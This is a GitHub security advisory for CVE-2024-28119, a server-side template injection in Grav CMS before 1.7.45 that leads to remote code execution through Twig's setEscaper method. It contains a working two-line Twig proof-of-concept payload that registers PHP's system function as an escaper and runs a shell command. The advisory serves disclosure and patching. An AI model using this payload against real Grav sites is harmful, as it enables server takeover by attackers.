# [H] Server Side Template Injection (SSTI) via Twig escape handler

## Summary
Severity: High
Advisory: GHSA-2m7x-c7px-hp58
CVE: CVE-2024-28119
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-03-22
Source: https://github.com/advisories/GHSA-2m7x-c7px-hp58
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <1.7.45

## Details
### Summary
Due to the unrestricted access to twig extension class from grav context, an attacker can redefine the escape function and execute arbitrary commands.

### Details
https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99
```php
/**
     * Defines a new escaper to be used via the escape filter.
     *
     * @param string   $strategy The strategy name that should be used as a strategy in the escape call
     * @param callable $callable A valid PHP callable
     */
    public function setEscaper($strategy, callable $callable)
    {
        $this->escapers[$strategy] = $callable;
    }
 ```
 Twig supports the functionality to redefine the escape function through the setEscaper method. 
However, that method is not originally exposed to the twig environment, but it is accessible through the payload below.

```plaintext
{{ grav.twig.twig.extensions.core.setEscaper('a','a') }}
```
At this point, it accepts callable type as an argument, but as there is no validation for the $callable variable, attackers can set dangerous functions like system as the escaper function.


### PoC
```
{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter')) }}
{{ var_dump(['id'] | escape('system', 'system')) }}
```

### Impact
Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.
As the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58
- https://nvd.nist.gov/vuln/detail/CVE-2024-28119
- https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe
- https://github.com/getgrav/grav
- https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99
